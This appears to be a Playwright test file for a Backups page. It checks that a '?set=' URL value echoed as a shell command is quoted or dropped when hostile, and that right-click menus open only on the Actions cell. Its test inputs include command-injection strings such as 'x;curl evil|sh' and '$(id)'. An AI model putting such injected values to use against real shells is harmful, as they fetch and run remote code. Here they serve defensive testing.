import { expect, test } from "@playwright/test";
import type { Page } from "@playwright/test";
import { open, row } from "./helpers";

/**
 * Issue #1202, the review of #1214: what a pasted address and a stray
 * right-click can do to the Backups page.
 *
 *   - `/backups?set=` takes any text, and the page prints the terminal twin of
 *     the list it shows. The echo is a line somebody pastes into a shell, so a
 *     hostile value is never printed raw: a set this deployment does not know
 *     is echoed only if it has the shape of a set id, and then quoted;
 *   - the row's right-click belongs to the browser, except on the Actions
 *     cell, where it opens that row's menu. Taking it over everywhere meant an
 *     operator could not copy a file name from a row.
 */
const BILLING = "billing-20260827.sql.gz";
const echoes = (page: Page) => page.getByTestId("set-filter-status").locator("code");

test.describe("#1202 the set filter's terminal twin is safe to paste", () => {
  test("#1202 a known set is echoed as the command it is", async ({ page }) => {
    await open(page, "/backups?set=production/billing-mysql");
    await expect(echoes(page)).toContainText("retnd artifacts --backup-set production/billing-mysql");
  });

  test("#1202 a hostile ?set= value is never printed as a command", async ({ page }) => {
    await open(page, "/backups?set=" + encodeURIComponent("x;curl evil|sh"));
    await expect(page.getByTestId("set-filter-status")).toBeVisible();
    await expect(echoes(page)).toHaveCount(0);
    await expect(page.getByTestId("set-filter-status")).not.toContainText("curl evil|sh --");
    expect(await page.locator("code").allTextContents()).not.toContain("retnd artifacts --backup-set x;curl evil|sh");
  });

  test("#1202 a removed set with a plain id is still echoed, and a spaced one is quoted or left out", async ({ page }) => {
    await open(page, "/backups?set=production/legacy-redis");
    await expect(echoes(page)).toContainText("retnd artifacts --backup-set production/legacy-redis");
    await open(page, "/backups?set=" + encodeURIComponent("a b/c$(id)"));
    for (const text of await echoes(page).allTextContents()) expect(text).not.toMatch(/--backup-set a b|\$\(id\)(?!')/);
  });
});

test.describe("#1202 the row's right-click is the browser's, except on the Actions cell", () => {
  test("#1202 a right-click on a data cell is not intercepted and opens no menu", async ({ page }) => {
    await open(page, "/backups");
    const cell = row(page, BILLING).getByRole("cell", { name: "Billing MySQL" });
    const prevented = await cell.evaluate((el) => {
      const ev = new MouseEvent("contextmenu", { bubbles: true, cancelable: true });
      el.dispatchEvent(ev);
      return ev.defaultPrevented;
    });
    expect(prevented).toBe(false);
    await expect(page.getByRole("menu")).toHaveCount(0);
  });

  test("#1202 a right-click on the Actions cell opens that row's menu", async ({ page }) => {
    await open(page, "/backups");
    await row(page, BILLING).locator("td.actcell").click({ button: "right", position: { x: 2, y: 2 } });
    await expect(page.getByRole("menu", { name: "Actions for " + BILLING })).toBeVisible();
    await expect(page).toHaveURL(/\/backups\?/);
  });
});
